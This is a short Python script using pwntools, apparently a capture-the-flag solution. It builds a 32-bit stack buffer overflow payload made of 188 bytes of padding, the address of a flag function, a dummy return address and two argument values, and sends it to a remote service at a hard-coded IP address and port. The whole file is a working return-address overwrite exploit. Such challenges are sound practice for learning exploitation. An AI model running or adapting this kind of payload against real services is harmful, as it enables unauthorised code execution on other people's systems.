#!/bin/python3
import struct
from pwn import *

padding = "A" * 188 
flag_addr = p32(0x080491e2)
param_1 = p32(0xdeadbeef)
param_2 = p32(0xc0ded00d)

#The additional AAAA should contain the address to return back (in order to have a clean exit)
payload = padding.encode() + flag_addr + "AAAA".encode() + param_1 +  param_2

conn = remote("134.122.99.74", 30609)

print(conn.recvline())

conn.send(payload)
conn.send("\n")

print(conn.recvall())


